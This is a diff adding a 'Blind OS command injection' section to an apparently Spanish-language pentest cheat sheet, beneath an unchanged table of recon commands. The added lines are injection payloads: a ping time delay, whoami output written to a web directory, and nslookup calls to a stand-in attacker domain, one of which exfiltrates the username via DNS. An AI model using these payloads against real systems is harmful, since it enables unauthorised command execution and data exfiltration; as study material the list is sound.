@@ -22,5 +22,11 @@ Terminar con ( " o ' ) en el payload
 | Network connections        | netstat -an  | netstat -an     |
 | Running processes          | ps -ef       | tasklist        |
 
-
+# Blind OS command injection vulnerabilities
+```
+& ping -c 10 127.0.0.1 &
+& whoami > /var/www/static/whoami.txt &
+& nslookup kgji2ohoyw.web-attacker.com &
+& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
+```
 
